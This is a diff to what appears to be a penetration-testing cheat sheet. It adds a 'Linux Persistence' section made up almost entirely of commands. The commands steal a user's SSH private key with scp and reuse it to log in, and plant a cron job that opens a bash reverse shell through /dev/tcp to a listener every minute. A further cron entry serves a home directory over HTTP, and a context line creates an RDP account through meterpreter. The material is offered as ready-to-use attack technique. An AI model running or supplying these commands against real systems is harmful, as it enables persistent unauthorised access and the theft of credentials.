@@ -622,4 +622,38 @@ meterpreter > run getgui -e -u hackersploit -p hacker_123321
 xfreerdp /u:hackersploit /p:hacker_123321 /v:<ip>
 ```
 
+### Linux Persistence
+#### Persistence Via SSH Keys
+```
+ssh <username>@<ip>
+cat .ssh/id_rsa
+
+scp <username>@<ip>:/home/<username>/.ssh/id_rsa ./
+chmod 400 id_rsa
+ssh -i id_rsa <username>@<ip>
+```
+
+#### Persistence Via Cron Jobs
+```
+ps -ef | grep cron
+
+cat /etc/cron*
+
+ls -al /etc/crontab
+-rw-r--r-- 1 root root 722 Nov 16  2017 /etc/crontab
+
+echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'" > cron
+
+crontab -i cron
+crontab -l
+
+cat /etc/crontab
+ls -al /etc/cron*
+
+nc -nvlp 1234
+```
+```
+echo "* * * * * cd /home/student/ && python -m SimpleHTTPServer" > cron
+```
+
 ## Social Engineering
